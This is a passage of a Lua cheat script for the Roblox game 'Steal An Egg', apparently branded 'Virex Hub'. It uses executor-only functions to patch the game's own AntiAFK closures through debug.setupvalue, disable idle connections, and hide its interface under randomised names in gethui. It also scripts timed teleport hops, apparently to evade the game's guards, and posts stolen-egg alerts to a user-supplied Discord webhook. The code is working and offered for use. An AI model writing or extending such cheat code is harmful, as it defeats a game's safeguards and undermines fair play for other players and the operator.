return tbl17.Pngs[arg] or nil
end
local ok, result = pcall(function()
local v13 = AssetService:CreateEditableImageAsync(Content.fromUri("rbxassetid://" .. arg))
local size = v13.Size
local n13 = math.floor(size.X)
local n14 = math.floor(size.Y)
local v14 = v13:ReadPixelsBuffer(Vector2.zero, size)
pcall(function()
v13:Destroy()
end)
local n15 = math.min(1, tbl17.MaxSide / math.max(n13, n14))
local n16 = math.max(1, math.floor(n13 * n15))
local n17 = math.max(1, math.floor(n14 * n15))
local v15 = buffer.create(n16 * n17 * 4)
for i = 0, n17 - 1 do
local n18 = math.min(n14 - 1, math.floor(i / n15))
for i2 = 0, n16 - 1 do
buffer.copy(v15, (i * n16 + i2) * 4, v14, (n18 * n13 + math.min(n13 - 1, math.floor(i2 / n15))) * 4, 4)
end
end
return fn22(v15, n16, n17)
end)
tbl17.Pngs[arg] = ok and type(result) == "string" and result or false
return tbl17.Pngs[arg] or nil
end
local function fn24(arg, arg2)
if arg2 then
return 13686498
end
if typeof(arg) ~= "Color3" then
return 5793266
end
return math.floor(arg.R * 255 + 0.5) * 65536 + math.floor(arg.G * 255 + 0.5) * 256 + math.floor(arg.B * 255 + 0.5)
end
local function fn25(arg)
local tbl18 = {}
if type(arg) == "table" then
for _, v13 in ipairs(arg) do
tbl18[#tbl18 + 1] = fn7(v13)
end
end
return #tbl18 > 0 and table.concat(tbl18, ", ") or "None"
end
local function fn26(arg)
local areas = tbl.Areas
local directory = type(areas) == "table" and (areas.Directory or areas) or nil
local str = tostring(arg or "")
local flag2 = type(directory) == "table" and str ~= "" and directory[str] or nil
if type(flag2) == "table" then
return tostring(flag2.DisplayName or str)
end
return str ~= "" and str or "Field"
end
local function fn27(arg, arg2, arg3, arg4, arg5, arg6)
local str = tostring(arg2)
local v13 = tbl12.AssetInfo(str)
local n13 = tonumber(arg3) or 1
local tbl18 = type(arg4) == "table" and arg4 or {}
local v14 = tbl12.Income(v13, n13, tbl18)
local dot = tbl17.Dot
local str2 = string.format("x%.2f", n13)
local eggRecords = tbl.EggRecords
if type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
local ok, result = pcall(eggRecords.WeightKgForScale, str, n13)
if ok and tonumber(result) then
str2 ..= dot .. tbl12.FormatWeight(result)
end
end
local emoji = tbl17.Emoji
local tbl19 = {}
local str3 = "**" .. tostring(v13.Name) .. "**" .. dot .. tostring(v13.Rarity)
local str4 = emoji.Value .. " **Value:** $" .. tbl12.FormatRate(v14)
local str5 = emoji.Size .. " **Size:** " .. str2
local str6 = emoji.Mutation .. " **Mutation:** " .. fn25(tbl18)
local str7 = emoji.Area .. " **Area:** " .. fn26(arg5)
tbl19[1] = str3
tbl19[2] = str4
tbl19[3] = str5
tbl19[4] = str6
tbl19[5] = str7
local tbl20 = {
author = { name = localPlayer.DisplayName, icon_url = fn20() },
title = arg,
description = table.concat(tbl19, "\n"),
color = fn24(v13.Color, string.upper(tostring(v13.Rarity)) == "SECRET"),
footer = { text = "Virex Hub" .. dot .. "Steal An Egg", icon_url = tbl17.Logo },
timestamp = DateTime.now():ToIsoDate(),
}
local tbl21 = { username = "Virex Hub", avatar_url = tbl17.Logo, embeds = { tbl20 } }
local icon = v13.Icon
if arg6 then
local directory = tbl.Assets and tbl.Assets.Directory
local flag2 = type(directory) == "table" and directory[str] or nil
local egg = type(flag2) == "table" and type(flag2.Egg) == "table" and flag2.Egg or nil
if egg and egg.Icon ~= nil then
icon = egg.Icon
end
end
local num = tonumber(string.match(tostring(icon or ""), "(%d+)"))
local v15 = num and fn23(num) or nil
local flag2 = num and not v15 and fn19(num) or nil
if v15 then
tbl20.thumbnail = { url = "attachment://egg.png" }
tbl21.attachments = { { id = 0, filename = "egg.png" } }
elseif flag2 then
tbl20.thumbnail = { url = flag2 }
end
return tbl21, v15
end
local function fn28()
if tbl17.Sending then
return
end
tbl17.Sending = true
task.spawn(function()
while #tbl17.Queue > 0 and not tbl17.Disposed do
local v13 = table.remove(tbl17.Queue, 1)
if fn16(tbl17.Url) and type(request_) == "function" then
local tbl18 = { Url = tbl17.Url, Method = "POST" }
if v13.Png then
local str = "ChilliHub" .. string.gsub(HttpService:GenerateGUID(false), "-", "")
tbl18.Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str }
local concat = table.concat
local tbl19 = {}
local png = v13.Png
local json = HttpService:JSONEncode(v13.Payload)
tbl19[1] = "--"
tbl19[2] = str
tbl19[3] = "\r\n"
tbl19[4] = "Content-Disposition: form-data; name=\"payload_json\"\r\n"
tbl19[5] = "Content-Type: application/json\r\n\r\n"
tbl19[6] = json
tbl19[7] = "\r\n"
tbl19[8] = "--"
tbl19[9] = str
tbl19[10] = "\r\n"
tbl19[11] = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"egg.png\"\r\n"
tbl19[12] = "Content-Type: image/png\r\n\r\n"
tbl19[13] = png
tbl19[14] = "\r\n"
tbl19[15] = "--"
tbl19[16] = str
tbl19[17] = "--\r\n"
tbl18.Body = concat(tbl19)
else
tbl18.Headers = { ["Content-Type"] = "application/json" }
tbl18.Body = HttpService:JSONEncode(v13.Payload)
end
local ok, result = pcall(request_, tbl18)
local num = ok and type(result) == "table" and tonumber(result.StatusCode) or nil
if num == 429 and v13.Tries < 3 then
v13.Tries = v13.Tries + 1
table.insert(tbl17.Queue, 1, v13)
task.wait(3)
elseif num ~= 200 and num ~= 204 and v13.Png then
v13.Png = nil
v13.Payload.attachments = nil
local flag2 = type(v13.Payload.embeds) == "table" and v13.Payload.embeds[1] or nil
if flag2 then
flag2.thumbnail = nil
end
table.insert(tbl17.Queue, 1, v13)
end
end
task.wait(1.2)
end
tbl17.Sending = false
end)
end
local function fn29()
return type(request_) == "function" and fn16(tbl17.Url)
end
local function fn30(arg, arg2)
if #tbl17.Queue >= 20 then
table.remove(tbl17.Queue, 1)
end
if tbl17.PingEveryone and type(arg) == "table" then
arg.content = "@everyone"
arg.allowed_mentions = { parse = { "everyone" } }
end
table.insert(tbl17.Queue, { Payload = arg, Png = arg2, Tries = 0 })
fn28()
end
local eggState = tbl.EggState
local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil
if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
local ok, result = pcall(carryChanged.Connect, carryChanged, function(arg)
if type(arg) ~= "table" then
return
end
if arg.IsCarrying then
tbl17.Carry = {
Category = tostring(arg.AssetCategory),
Uid = tostring(arg.Uid),
Area = tostring(arg.AreaId or "Field"),
EndedAt = nil,
}
elseif tbl17.Carry then
tbl17.Carry.EndedAt = os.clock()
end
end)
if ok and result then
fn4(function()
pcall(function()
result:Disconnect()
end)
end)
end
end
fn4(function()
tbl17.Disposed = true
end)
task.spawn(function()
while not tbl17.Disposed do
local flag2 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
local flag3 = false
local result = nil
if flag2 then
flag3, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
end
if flag3 and type(result) == "table" then
local known = tbl17.Known
local tbl18 = {}
local known2 = {}
for k, v13 in pairs(result) do
local str = tostring(k)
known2[str] = true
if known and not known[str] and type(v13) == "table" then
tbl18[#tbl18 + 1] = { Uid = str, Record = v13 }
end
end
tbl17.Known = known2
local carry = tbl17.Carry
if tbl17.Stolen and carry and #tbl18 > 0 then
for _, v13 in ipairs(tbl18) do
local record = v13.Record
local flag4 = carry.EndedAt == nil
if not flag4 then
local endedAt = carry.EndedAt
flag4 = os.clock() - endedAt < 20
end
if flag4 then
flag4 = v13.Uid == carry.Uid
if not flag4 then
local category = carry.Category
flag4 = tostring(record.AssetCategory) == category
end
end
if flag4 then
tbl17.Carry = nil
local mutations = type(record.Mutations) == "table" and record.Mutations or {}
task.spawn(function()
if fn29() then
fn30(fn27("Egg Stolen!", record.AssetCategory, record.AssetScale, mutations, carry.Area))
end
end)
break
end
end
end
end
task.wait(1.5)
end
end)
local function fn31(arg)
local input = tbl17.Input
if type(input) ~= "table" then
return
end
for _, v13 in ipairs({ "Set", "SetValue" }) do
local ok, result = pcall(function()
return input[v13]
end)
if ok and type(result) == "function" and pcall(result, input, arg, false) then
return
end
end
end
tbl17.Input = v7:CreateInput({
Name = "Webhook URL",
Placeholder = "https://discord.com/api/webhooks/...",
Default = tbl17.Saved,
MaxLength = 256,
Callback = function(arg)
local v13 = string.gsub(tostring(arg or ""), "%s", "")
local flag2 = v13 == "" and tbl17.Saved ~= ""
local flag3
if flag2 then
local loadedAt = tbl17.LoadedAt
flag3 = os.clock() - loadedAt < 5
else
flag3 = flag2
end
if flag3 then
tbl17.Url = tbl17.Saved
task.defer(fn31, tbl17.Saved)
return
end
tbl17.Url = v13
if (v13 == "" or fn16(v13)) and v13 ~= tbl17.Saved and type(writefile) == "function" then
if pcall(writefile, tbl17.Path, v13) then
tbl17.Saved = v13
end
end
end,
})
v7:CreateToggle({
Name = "Ping @everyone",
Default = false,
Callback = function(arg)
tbl17.PingEveryone = arg == true
end,
})
v7:CreateToggle({
Name = "Notify Stolen Eggs",
Note = "Post every egg you bring home",
Default = false,
Callback = function(arg)
tbl17.Stolen = arg == true
end,
})
end
local v13
v13 = v2:CreateTab({ Name = "Misc", SectionsExpanded = true })
local v14
v14 = v13:CreateSection({ Name = "Performance", Expanded = true })
local flag2 = false
v14:CreateSlider({
Name = "FPS Cap",
Min = 30,
Max = 1000,
Default = 240,
AllowDecimals = false,
Increment = 1,
Unit = " FPS",
Callback = function(arg)
local n13 = math.clamp(math.floor(tonumber(arg) or 240), 30, 1000)
if type(setfpscap) == "function" and pcall(setfpscap, n13) then
flag2 = false
return
end
if not flag2 then
flag2 = true
fn15("FPS Cap Unavailable", "This environment does not support setfpscap.")
end
end,
})
do
local Lighting = game:GetService("Lighting")
local n13 = 0.003
local flag3 = false
local n14 = 0
local thread = nil
local tbl17 = {}
local tbl18 = {}
local obj = setmetatable({}, { __mode = "k" })
local tbl19 = {}
local connection = nil
local function fn16(arg, arg2, arg3)
local ok, result = pcall(arg)
if not ok then
return
end
tbl18[#tbl18 + 1] = { Setter = arg2, Value = result }
pcall(arg2, arg3)
end
local function fn17(arg, arg2, arg3)
local tbl20 = obj[arg]
if not tbl20 then
tbl20 = {}
obj[arg] = tbl20
end
if tbl20[arg2] == nil then
local ok, result = pcall(function()
return arg[arg2]
end)
if not ok then
return
end
tbl20[arg2] = { Value = result }
end
pcall(function()
arg[arg2] = arg3
end)
end
local function fn18(arg)
if not flag3 or not arg.Parent then
return
end
if arg:IsA("ParticleEmitter") then
fn17(arg, "Enabled", false)
fn17(arg, "Rate", 0)
elseif arg:IsA("Trail") or arg:IsA("Beam") then
fn17(arg, "Enabled", false)
elseif arg:IsA("PointLight") or arg:IsA("SpotLight") or arg:IsA("SurfaceLight") then
fn17(arg, "Enabled", false)
fn17(arg, "Brightness", 0)
elseif arg:IsA("Fire") or arg:IsA("Smoke") or arg:IsA("Sparkles") then
fn17(arg, "Enabled", false)
elseif arg:IsA("Explosion") then
fn17(arg, "Visible", false)
elseif arg:IsA("SpecialMesh") then
fn17(arg, "TextureId", "")
elseif arg:IsA("Decal") or arg:IsA("Texture") then
if not (arg.Name == "face" and arg.Parent and arg.Parent.Name == "Head") then
fn17(arg, "Transparency", 1)
end
elseif arg:IsA("MeshPart") then
fn17(arg, "RenderFidelity", Enum.RenderFidelity.Performance)
fn17(arg, "TextureID", "")
fn17(arg, "CastShadow", false)
fn17(arg, "Reflectance", 0)
fn17(arg, "Material", Enum.Material.SmoothPlastic)
elseif arg:IsA("BasePart") then
fn17(arg, "CastShadow", false)
fn17(arg, "Reflectance", 0)
fn17(arg, "Material", Enum.Material.SmoothPlastic)
elseif arg:IsA("PostEffect") then
fn17(arg, "Enabled", false)
elseif arg:IsA("Clouds") then
fn17(arg, "Cover", 0)
fn17(arg, "Density", 0)
elseif arg:IsA("Atmosphere") then
fn17(arg, "Density", 0)
fn17(arg, "Haze", 0)
fn17(arg, "Glare", 0)
end
end
local function fn19()
for _, v15 in ipairs(tbl17) do
if v15.Connected then
v15:Disconnect()
end
end
table.clear(tbl17)
if connection then
pcall(function()
connection:Disconnect()
end)
connection = nil
end
end
local function fn20()
local rendering = settings().Rendering
local terrain = workspace.Terrain
local function fn21(arg, arg2, arg3)
fn16(function()
return arg[arg2]
end, function(arg4)
arg[arg2] = arg4
end, arg3)
end
fn21(rendering, "QualityLevel", Enum.QualityLevel.Level01)
fn21(rendering, "MeshPartDetailLevel", Enum.MeshPartDetailLevel.Level01)
fn21(rendering, "EditQualityLevel", Enum.QualityLevel.Level01)
local ok, result = pcall(function()
return UserSettings():GetService("UserGameSettings")
end)
if ok and result then
fn21(result, "SavedQualityLevel", Enum.SavedQualitySetting.QualityLevel1)
end
fn21(Lighting, "GlobalShadows", false)
fn21(Lighting, "ShadowSoftness", 0)
fn21(Lighting, "FogEnd", 9e9)
fn21(Lighting, "Technology", Enum.Technology.Legacy)
fn21(Lighting, "EnvironmentDiffuseScale", 0)
fn21(Lighting, "EnvironmentSpecularScale", 0)
fn21(terrain, "Decoration", false)
fn21(terrain, "WaterWaveSize", 0)
fn21(terrain, "WaterWaveSpeed", 0)
fn21(terrain, "WaterReflectance", 0)
fn21(terrain, "WaterTransparency", 1)
end
local function fn21(arg, arg2)
local now = os.clock()
for _, descendant in ipairs(arg:GetDescendants()) do
if not flag3 or n14 ~= arg2 then
return false
end
fn18(descendant)
if os.clock() - now > n13 then
RunService.Heartbeat:Wait()
now = os.clock()
end
end
return true
end
local function fn22()
if not flag3 or #tbl19 == 0 then
return
end
local now = os.clock()
while #tbl19 > 0 do
local v15 = table.remove(tbl19)
fn18(v15)
if not (n13 < os.clock() - now) then
continue
end
break
end
end
local function fn23()
local now = os.clock()
for k, v15 in pairs(obj) do
if k.Parent then
for k2, v16 in pairs(v15) do
pcall(function()
k[k2] = v16.Value
end)
end
end
obj[k] = nil
if n13 < os.clock() - now then
RunService.Heartbeat:Wait()
now = os.clock()
end
end
end
local function fn24()
if not flag3 then
return
end
flag3 = false
n14 += 1
fn19()
table.clear(tbl19)
if thread then
pcall(task.cancel, thread)
thread = nil
end
fn23()
for i = #tbl18, 1, -1 do
local v15 = tbl18[i]
pcall(v15.Setter, v15.Value)
end
table.clear(tbl18)
end
local function fn25()
if flag3 then
return
end
flag3 = true
n14 += 1
local v15 = n14
fn20()
local function fn26(arg)
tbl17[#tbl17 + 1] = arg.DescendantAdded:Connect(function(descendant)
if flag3 and n14 == v15 then
tbl19[#tbl19 + 1] = descendant
end
end)
end
fn26(workspace)
fn26(Lighting)
connection = RunService.Heartbeat:Connect(function()
if flag3 and n14 == v15 then
fn22()
end
end)
thread = task.spawn(function()
if fn21(workspace, v15) then
fn21(Lighting, v15)
end
end)
end
fn4(fn24)
v14:CreateToggle({
Name = "Optimizer",
Note = "Strip shadows, textures and effects for the highest FPS",
Default = false,
Callback = function(arg)
if arg then
fn25()
else
task.spawn(fn24)
end
end,
})
end
do
local Stats = game:GetService("Stats")
local n13 = 132
local n14 = 0.085
local n15 = 0.2
local n16 = 8
local v15 = v2:CreateState({ Name = "FPS and Ping Position", Default = {} })
local function fn16()
local v16 = v15:Get()
if type(v16) == "table" and type(v16.XOffset) == "number" and type(v16.YOffset) == "number" then
return UDim2.new(tonumber(v16.XScale) or 0, v16.XOffset, tonumber(v16.YScale) or 0, v16.YOffset)
end
return UDim2.new(0, 16, 0, 16)
end
local function fn17(arg)
v15:Set({ XScale = arg.X.Scale, XOffset = arg.X.Offset, YScale = arg.Y.Scale, YOffset = arg.Y.Offset })
end
local color3 = Color3.fromRGB(58, 255, 55)
local color4 = Color3.fromRGB(255, 214, 84)
local color5 = Color3.fromRGB(255, 96, 96)
local color6 = Color3.fromRGB(150, 150, 158)
local flag3 = false
local tbl17 = {}
local screenGui = nil
local frame = nil
local uiScale = nil
local v16 = nil
local v17 = nil
local n17 = 1
local n18 = 0
local n19 = 0
local v18 = nil
local v19 = nil
local font = nil
pcall(function()
font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
end)
local function fn18(arg)
if arg >= 100 then
return color3
end
if arg >= 50 then
return color4
end
return color5
end
local function fn19(arg)
if arg <= 90 then
return color3
end
if arg <= 180 then
return color4
end
return color5
end
local function fn20()
if not uiScale then
return
end
local currentCamera = workspace.CurrentCamera
currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)
if currentCamera.X < 1 then
currentCamera = Vector2.new(1280, 720)
end
uiScale.Scale = math.clamp(currentCamera.X * n14 / n13, 0.7, 1.4) * n17
end
local function fn21()
for _, v20 in ipairs(tbl17) do
pcall(function()
v20:Disconnect()
end)
end
table.clear(tbl17)
if screenGui then
pcall(function()
screenGui:Destroy()
end)
end
screenGui = nil
frame = nil
uiScale = nil
v16 = nil
v17 = nil
v18 = nil
v19 = nil
n18 = 0
end
local function createTextLabel(parent, arg, arg2, textColor3)
local textLabel = Instance.new("TextLabel")
textLabel.Name = fn3()
textLabel.BackgroundTransparency = 1
textLabel.Position = UDim2.fromOffset(arg, 9)
textLabel.Size = UDim2.fromOffset(arg2, 16)
textLabel.Text = ""
textLabel.TextColor3 = textColor3
textLabel.TextScaled = true
textLabel.TextXAlignment = Enum.TextXAlignment.Left
if font then
textLabel.FontFace = font
else
textLabel.Font = Enum.Font.GothamBold
end
textLabel.Parent = parent
return textLabel
end
local function fn22()
fn21()
screenGui = Instance.new("ScreenGui")
screenGui.Name = fn3()
screenGui.Archivable = false
screenGui.DisplayOrder = 58
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
frame = Instance.new("Frame")
frame.Name = fn3()
frame.Active = true
frame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
frame.BackgroundTransparency = 0.28
frame.BorderSizePixel = 0
frame.Position = fn16()
frame.Size = UDim2.fromOffset(132, 34)
frame.Parent = screenGui
local uiCorner = Instance.new("UICorner")
uiCorner.Name = fn3()
uiCorner.CornerRadius = UDim.new(0, 12)
uiCorner.Parent = frame
local uiStroke = Instance.new("UIStroke")
uiStroke.Name = fn3()
uiStroke.Color = Color3.fromRGB(255, 255, 255)
uiStroke.Thickness = 1
uiStroke.Transparency = 0.9
uiStroke.Parent = frame
uiScale = Instance.new("UIScale")
uiScale.Name = fn3()
uiScale.Parent = frame
fn20()
v16 = createTextLabel(frame, 12, 34, color3)
createTextLabel(frame, 48, 22, color6).Text = "FPS" -- disabled
local frame2 = Instance.new("Frame")
frame2.Name = fn3()
frame2.AnchorPoint = Vector2.new(0.5, 0.5)
frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame2.BackgroundTransparency = 0.85
frame2.BorderSizePixel = 0
frame2.Position = UDim2.new(0, 74, 0.5, 0)
frame2.Size = UDim2.fromOffset(1, 14)
frame2.Parent = frame
v17 = createTextLabel(frame, 82, 30, color3)
createTextLabel(frame, 113, 14, color6).Text = "ms"
screenGui.Parent = v3
local currentCamera = workspace.CurrentCamera
if currentCamera then
tbl17[#tbl17 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn20)
end
local flag4 = false
local v20 = nil
local vector2 = Vector2.zero
local position = nil
tbl17[#tbl17 + 1] = frame.InputBegan:Connect(function(input)
if flag4 or input.UserInputState ~= Enum.UserInputState.Begin then
return
end
local flag5 = input.UserInputType == Enum.UserInputType.Touch
if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not flag5 then
return
end
flag4 = true
v20 = flag5 and input or nil
vector2 = Vector2.new(input.Position.X, input.Position.Y)
position = frame.Position
end)
tbl17[#tbl17 + 1] = UserInputService.InputChanged:Connect(function(input)
if not flag4 or not frame or not position then
return
end
if not (v20 and input == v20 or not v20 and input.UserInputType == Enum.UserInputType.MouseMovement) then
return
end
local n20 = Vector2.new(input.Position.X, input.Position.Y) - vector2
frame.Position = UDim2.new(position.X.Scale, position.X.Offset + n20.X, position.Y.Scale, position.Y.Offset + n20.Y)
end)
tbl17[#tbl17 + 1] = UserInputService.InputEnded:Connect(function(input)
if not flag4 then
return
end
if v20 and input == v20 or not v20 and input.UserInputType == Enum.UserInputType.MouseButton1 then
flag4 = false
v20 = nil
position = nil
if frame then
fn17(frame.Position)
end
end
end)
tbl17[#tbl17 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
if not flag3 or not v16 then
return
end
local n20 = math.clamp(deltaTime, 0.001, 1)
local n21 = 1 / n20
if n18 <= 0 then
n18 = n21
else
n18 += (n21 - n18) * (1 - math.exp(-n20 * n16))
end
local now = os.clock()
if now < n19 then
return
end
n19 = now + n15
local n22 = math.floor(n18 + 0.5)
local text = tostring(n22)
if text ~= v18 then
v18 = text
v16.Text = text
v16.TextColor3 = fn18(n22)
end
local n23 = 0
pcall(function()
n23 = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
end)
local n24 = math.floor(n23 + 0.5)
local text2 = tostring(n24)
if text2 ~= v19 then
v19 = text2
v17.Text = text2
v17.TextColor3 = fn19(n24)
end
end)
end
-- FPS and Ping UI completely removed to avoid empty space
fn4(fn21)
end
do
local flag3 = false
local v15 = nil
local function fn16(arg)
if v15 then
pcall(function()
v15:Destroy()
end)
v15 = nil
end
tbl4.RenderBackdrop = nil
if not arg then
return
end
local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
if not playerGui then
return
end
local screenGui = Instance.new("ScreenGui")
screenGui.Name = fn3()
screenGui.DisplayOrder = -1000
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
local frame = Instance.new("Frame")
frame.Name = fn3()
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 0
frame.Size = UDim2.fromScale(1, 1)
frame.Parent = screenGui
tbl4.RenderBackdrop = screenGui
screenGui.Parent = playerGui
v15 = screenGui
end
local function fn17(arg)
pcall(function()
RunService:Set3dRenderingEnabled(arg)
end)
pcall(fn16, not arg)
end
v14:CreateToggle({
Name = "Disable 3D Render",
Default = false,
Callback = function(arg)
flag3 = arg == true
fn17(not flag3)
end,
})
fn4(function()
if flag3 then
fn17(true)
end
end)
end
do
local v15 = v13:CreateSection({ Name = "Utility", Expanded = true })
local tbl17 = { Enabled = true, Alive = true, Silenced = {} }
local function fn16()
if type(getconnections) ~= "function" then
return {}
end
local ok, result = pcall(getconnections, localPlayer.Idled)
return ok and type(result) == "table" and result or {}
end
local function fn17()
for _, v16 in ipairs(fn16()) do
if pcall(function()
v16:Disable()
end) then
tbl17.Silenced[#tbl17.Silenced + 1] = v16
end
end
end
local function fn18()
local silenced = tbl17.Silenced
if #silenced == 0 then
silenced = fn16()
end
for _, v16 in ipairs(silenced) do
pcall(function()
v16:Enable()
end)
end
table.clear(tbl17.Silenced)
end
local obj = setmetatable({}, { __index = function()
return function()
end
end })
local tbl18 = {}
local function fn19()
local tbl19 = {}
if type(getgc) ~= "function" or type(debug) ~= "table" or type(debug.getupvalues) ~= "function" then
return tbl19
end
local ok, result = pcall(getgc, false)
if not ok or type(result) ~= "table" then
return tbl19
end
for _, v16 in ipairs(result) do
if type(v16) == "function" and islclosure(v16) then
local ok2, result2 = pcall(debug.info, v16, "s")
if ok2 and type(result2) == "string" and string.find(result2, "AntiAFK", 1, true) then
local ok3, result3 = pcall(debug.getupvalues, v16)
if ok3 and type(result3) == "table" then
for k, v17 in pairs(result3) do
if typeof(v17) == "Instance" and v17.ClassName == "TeleportService" then
tbl19[#tbl19 + 1] = { Fn = v16, Index = k, Original = v17 }
end
end
end
end
end
end
return tbl19
end
local function fn20()
for _, v16 in ipairs(fn19()) do
local ok, result = pcall(debug.getupvalue, v16.Fn, v16.Index)
if ok and typeof(result) == "Instance" then
if pcall(debug.setupvalue, v16.Fn, v16.Index, obj) then
tbl18[#tbl18 + 1] = v16
end
end
end
end
local function fn21()
for _, v16 in ipairs(tbl18) do
pcall(debug.setupvalue, v16.Fn, v16.Index, v16.Original)
end
table.clear(tbl18)
end
local function fn22()
fn17()
if #tbl18 == 0 then
fn20()
end
end
local connection = localPlayer.CharacterAdded:Connect(function()
task.delay(1, function()
if tbl17.Alive and tbl17.Enabled then
table.clear(tbl17.Silenced)
pcall(fn22)
end
end)
end)
fn4(function()
pcall(function()
connection:Disconnect()
end)
end)
fn4(function()
tbl17.Alive = false
fn18()
fn21()
end)
task.spawn(function()
while tbl17.Alive do
if tbl17.Enabled then
fn22()
end
task.wait(600)
end
end)
v15:CreateToggle({
Name = "Anti AFK",
Default = true,
Callback = function(arg)
tbl17.Enabled = arg ~= false
if tbl17.Enabled then
fn22()
else
fn18()
fn21()
end
end,
})
end
local GuiService2, StarterGui, antiGuard, tbl17, chilliAntiGuard, tbl18, tbl19, n13, flag3, tbl20
local tbl21, fn16, hui, fn17, ScreenGui, Frame, UIScale, Frame2, UIScale2, UIGradient
local fn18
do
local TweenService = game:GetService("TweenService")
GuiService2 = game:GetService("GuiService")
StarterGui = game:GetService("StarterGui")
antiGuard = tbl4.AntiGuard
tbl17 = {
Target = "line",
LineOffset = 8,
Height = 45,
OffsetX = -90,
OffsetZ = -35,
Jitter = 0,
Point = false,
Disguise = true,
Limp = true,
Facing = "Zero",
Freeze = false,
StartAt = 0,
Steps = {
{ At = 0.1, To = "home" },
{ At = 0.33, To = "home" },
{ At = 0.56, To = "home" },
{ At = 0.75, To = "start" },
},
ReleaseAt = 0.8,
WeldScanGap = 0.03,
BusyLimit = 2.5,
}
local function fn19(arg, arg2, arg3, arg4, arg5, arg6)
local tbl22 = {}
for i = 1, arg do
tbl22[#tbl22 + 1] = { At = arg2 + arg3 * (i - 1), To = "home" }
end
tbl22[#tbl22 + 1] = { At = arg4, To = "start" }
return {
Target = "home",
LineOffset = 8,
Height = 0,
OffsetX = 0,
OffsetZ = 0,
Jitter = 0,
Point = false,
Disguise = true,
Limp = false,
Facing = "Zero",
Freeze = true,
StartAt = 0,
StartRandom = 0,
HopRandom = 0.085,
HoldRandom = 0.395,
Steps = tbl22,
ReleaseAt = arg5,
WeldScanGap = 0.03,
BusyLimit = arg6,
}
end
chilliAntiGuard = { LightDark = tbl17, Default = fn19(25, 0, 0.05, 1.27, 1.52, 2.5) }
pcall(function()
getgenv().ChilliAntiGuard = chilliAntiGuard
end)
tbl18 = {
Card = Color3.fromRGB(15, 15, 19),
CardTop = Color3.fromRGB(24, 22, 28),
Stroke = Color3.fromRGB(48, 46, 56),
Text = Color3.fromRGB(240, 238, 244),
AccentA = Color3.fromRGB(255, 72, 72),
AccentB = Color3.fromRGB(255, 150, 60),
Good = Color3.fromRGB(80, 220, 140),
Work = Color3.fromRGB(255, 190, 70),
Bad = Color3.fromRGB(240, 90, 90),
Off = Color3.fromRGB(58, 56, 66),
}
tbl19 = {
{ Path = { "GearGiver_Slap", "Podium" }, Offset = Vector3.new(-16.415, 21.072, -6.106) },
{
Path = { "World", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
Offset = Vector3.new(-26.776, 1.75, 18.665),
},
{
Path = { "__OBJECTS", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
Offset = Vector3.new(-26.776, 1.75, 18.665),
},
}
n13 = 52
flag3 = true
tbl20 = {}
tbl21 = {
AreaId = nil,
SignalCarrying = false,
WeldCarrying = false,
Carrying = false,
Active = false,
Disguise = nil,
FlashRequest = nil,
FlashUntil = 0,
}
fn16 = function()
local tbl22 = {}
for i = 1, math.random(10, 16) do
tbl22[i] = string.char(math.random(97, 122))
end
return table.concat(tbl22)
end
hui = nil
pcall(function()
hui = gethui()
end)
hui = hui or CoreGui
local function fn20(arg, parent, arg2)
local instance = Instance.new(arg)
instance.Name = fn16()
local v15 = pairs
local tbl22 = arg2 or {}
for k, v16 in v15(tbl22) do
instance[k] = v16
end
instance.Parent = parent
return instance
end
fn17 = function(arg, arg2, arg3, arg4)
local ok, result = pcall(function()
return TweenService:Create(arg, TweenInfo.new(arg2, arg4 or Enum.EasingStyle.Quint, Enum.EasingDirection.Out), arg3)
end)
if ok and result then
result:Play()
end
end
ScreenGui = fn20("ScreenGui", nil, {
ResetOnSpawn = false,
IgnoreGuiInset = true,
DisplayOrder = -100,
ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
Enabled = false, -- Anti Guard floating bar removed
})
Frame = fn20("Frame", ScreenGui, {
AnchorPoint = Vector2.new(0.5, 0),
Position = UDim2.new(0.5, 0, 0, 8),
Size = UDim2.fromOffset(210, 48),
BackgroundTransparency = 1,
Visible = false,
})
UIScale = fn20("UIScale", Frame, { Scale = 1 })
Frame2 = fn20("Frame", Frame, {
Size = UDim2.fromScale(1, 1),
BackgroundColor3 = tbl18.Card,
BorderSizePixel = 0,
Active = true,
})
fn20("UICorner", Frame2, { CornerRadius = UDim.new(0, 18) })
UIScale2 = fn20("UIScale", Frame2, { Scale = 0.9 })
fn20("UIGradient", Frame2, { Color = ColorSequence.new(tbl18.CardTop, tbl18.Card), Rotation = 90 })
local UIStroke = fn20("UIStroke", Frame2, {
Thickness = 1.5,
Color = Color3.fromRGB(255, 255, 255),
Transparency = 0.2,
ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
})
UIGradient = fn20("UIGradient", UIStroke, { Color = ColorSequence.new(tbl18.Stroke, tbl18.Stroke) })
local Frame3 = fn20("Frame", Frame2, {
AnchorPoint = Vector2.new(0, 0.5),
Position = UDim2.new(0, 10, 0.5, 0),
Size = UDim2.fromOffset(36, 36),
BackgroundColor3 = Color3.fromRGB(28, 26, 32),
BorderSizePixel = 0,
ZIndex = 2,
})
fn20("UICorner", Frame3, { CornerRadius = UDim.new(0, 11) })
